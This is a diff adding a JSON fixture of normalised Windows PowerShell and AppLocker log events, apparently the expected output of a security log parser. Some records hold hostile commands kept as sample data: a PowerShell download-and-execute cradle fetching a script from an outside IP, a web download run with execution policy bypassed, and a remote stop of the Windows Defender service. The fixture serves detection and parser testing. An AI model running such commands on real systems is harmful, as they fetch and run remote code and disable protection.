@@ -1,0 +1,218 @@
+[
+  {
+    "line": 1,
+    "extractor_path": "WINDOWS_POWERSHELL_SNARE_CHILD_MGMT",
+    "schema": "scwx.managementevent",
+    "normalized": {
+      "sensor_type": "Windows PowerShell",
+      "event_time_usec": 1792024265000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "30411",
+      "host_id": "ws01.example.com",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "event_id": 4104,
+      "target_hostname": "ws01.example.com",
+      "script_language": "PowerShell",
+      "operation_name": "PowerShell script block",
+      "script": "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')",
+      "possible_cause": "PowerShell flagged the script block as suspicious",
+      "username": "EXAMPLE\\jdoe"
+    }
+  },
+  {
+    "line": 2,
+    "extractor_path": "WINDOWS_POWERSHELL_SNARE_CHILD_MGMT",
+    "schema": "scwx.managementevent",
+    "normalized": {
+      "sensor_type": "Windows PowerShell",
+      "event_time_usec": 1792024360000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "88213",
+      "host_id": "srv02.example.com",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "event_id": 4104,
+      "target_hostname": "srv02.example.com",
+      "script_language": "PowerShell",
+      "operation_name": "PowerShell script block, part 2 of 3",
+      "script": "$files = Get-ChildItem -Path D:\\Backups -Filter *.bak  foreach ($f in $files) {     Copy-Item $f.FullName -Destination \\\\nas01.example.com\\archive\\ }",
+      "script_file_path": "C:\\Scripts\\Rotate-Backups.ps1",
+      "username": "EXAMPLE\\svc-backup"
+    }
+  },
+  {
+    "line": 3,
+    "extractor_path": "WINDOWS_POWERSHELL_SNARE_CHILD_MGMT",
+    "schema": "scwx.managementevent",
+    "normalized": {
+      "sensor_type": "Windows PowerShell",
+      "event_time_usec": 1792024392000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "1207",
+      "host_id": "ws01.example.com",
+      "channel": "PowerShellCore/Operational",
+      "event_id": 4104,
+      "target_hostname": "ws01.example.com",
+      "script_language": "PowerShell",
+      "operation_name": "PowerShell script block",
+      "script": "Get-Process | Where-Object CPU -gt 100",
+      "username": "EXAMPLE\\jdoe"
+    }
+  },
+  {
+    "line": 4,
+    "extractor_path": "WINDOWS_POWERSHELL_SNARE_CHILD_MGMT",
+    "schema": "scwx.managementevent",
+    "normalized": {
+      "sensor_type": "Windows PowerShell",
+      "event_time_usec": 1792024266000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "30412",
+      "host_id": "ws01.example.com",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "event_id": 4103,
+      "target_hostname": "ws01.example.com",
+      "script_language": "PowerShell",
+      "operation_name": "PowerShell pipeline execution",
+      "script": "CommandInvocation(Invoke-WebRequest): \"Invoke-WebRequest\" ParameterBinding(Invoke-WebRequest): name=\"Uri\"; value=\"http://198.51.100.66/a.ps1\" ParameterBinding(Invoke-WebRequest): name=\"OutFile\"; value=\"C:\\Users\\jdoe\\AppData\\Local\\Temp\\a.ps1\"",
+      "command": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass",
+      "operation": "Invoke-WebRequest",
+      "username": "EXAMPLE\\jdoe",
+      "remote_operation": false
+    }
+  },
+  {
+    "line": 5,
+    "extractor_path": "WINDOWS_POWERSHELL_SNARE_CHILD_MGMT",
+    "schema": "scwx.managementevent",
+    "normalized": {
+      "sensor_type": "Windows PowerShell",
+      "event_time_usec": 1792024460000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "88214",
+      "host_id": "srv02.example.com",
+      "channel": "Microsoft-Windows-PowerShell/Operational",
+      "event_id": 4103,
+      "target_hostname": "srv02.example.com",
+      "script_language": "PowerShell",
+      "operation_name": "PowerShell pipeline execution",
+      "script": "CommandInvocation(Stop-Service): \"Stop-Service\" ParameterBinding(Stop-Service): name=\"Name\"; value=\"WinDefend\"",
+      "script_file_path": "C:\\Scripts\\Maint.ps1",
+      "command": "C:\\Windows\\system32\\wsmprovhost.exe -Embedding",
+      "operation": "Stop-Service",
+      "username": "EXAMPLE\\admin.jlee",
+      "remote_operation": true
+    }
+  },
+  {
+    "line": 6,
+    "extractor_path": null,
+    "schema": "scwx.generic",
+    "normalized": null
+  },
+  {
+    "line": 7,
+    "extractor_path": "WINDOWS_APPLOCKER_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Windows AppLocker",
+      "event_time_usec": 1792024801000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "5120",
+      "host_id": "ws01.example.com",
+      "computer_name": "ws01.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "image_path": "%PROGRAMFILES%\\ACME\\VIEWER\\VIEWER.EXE",
+      "process": "VIEWER.EXE",
+      "username": "EXAMPLE\\jdoe",
+      "was_blocked": false
+    }
+  },
+  {
+    "line": 8,
+    "extractor_path": "WINDOWS_APPLOCKER_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Windows AppLocker",
+      "event_time_usec": 1792024815000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "5121",
+      "host_id": "ws01.example.com",
+      "computer_name": "ws01.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "image_path": "%OSDRIVE%\\USERS\\JDOE\\APPDATA\\LOCAL\\TEMP\\TOOL.EXE",
+      "process": "TOOL.EXE",
+      "username": "EXAMPLE\\jdoe",
+      "was_blocked": false
+    }
+  },
+  {
+    "line": 9,
+    "extractor_path": "WINDOWS_APPLOCKER_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Windows AppLocker",
+      "event_time_usec": 1792024862000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "5122",
+      "host_id": "ws01.example.com",
+      "computer_name": "ws01.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "image_path": "%OSDRIVE%\\USERS\\JDOE\\DOWNLOADS\\INVOICE.EXE",
+      "process": "INVOICE.EXE",
+      "username": "EXAMPLE\\jdoe",
+      "was_blocked": true
+    }
+  },
+  {
+    "line": 10,
+    "extractor_path": "WINDOWS_APPLOCKER_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Windows AppLocker",
+      "event_time_usec": 1792024950000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "7701",
+      "host_id": "srv02.example.com",
+      "computer_name": "srv02.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "image_path": "%OSDRIVE%\\PROGRAMDATA\\UPDATE.PS1",
+      "process": "UPDATE.PS1",
+      "username": "EXAMPLE\\svc-backup",
+      "was_blocked": true
+    }
+  },
+  {
+    "line": 11,
+    "extractor_path": "WINDOWS_APPLOCKER_SNARE_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "Windows AppLocker",
+      "event_time_usec": 1792024991000000,
+      "event_time_fidelity": "MICRO",
+      "sensor_event_id": "5130",
+      "host_id": "ws01.example.com",
+      "computer_name": "ws01.example.com",
+      "os": {
+        "os": "OS_WINDOWS"
+      },
+      "image_path": "%OSDRIVE%\\USERS\\JDOE\\DOWNLOADS\\SETUP.JS",
+      "process": "SETUP.JS",
+      "username": "EXAMPLE\\jdoe",
+      "was_blocked": true
+    }
+  },
+  {
+    "line": 12,
+    "extractor_path": null,
+    "schema": "scwx.generic",
+    "normalized": null
+  }
+]
